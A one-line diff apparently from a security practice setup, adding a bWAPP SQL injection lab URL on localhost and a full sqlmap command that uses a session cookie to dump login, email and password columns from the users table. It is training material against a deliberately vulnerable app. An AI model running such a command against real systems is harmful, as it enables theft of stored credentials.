@@ -1,0 +1,1 @@
+http://localhost:8080/sqli_1.php?title=Iron+Man (GET)  # /usr/bin/sqlmap -u http://localhost:8080/sqli_1.php?title=Iron+Man "--cookie=PHPSESSID=2qaflmkrk00hrsk5j00hvfnhu4; security_level=0" --batch --level=1 --risk=1 -D bWAPP -T users -C login,email,password --where=id<=3 --dump --flush-session --output-dir=./sqlmap
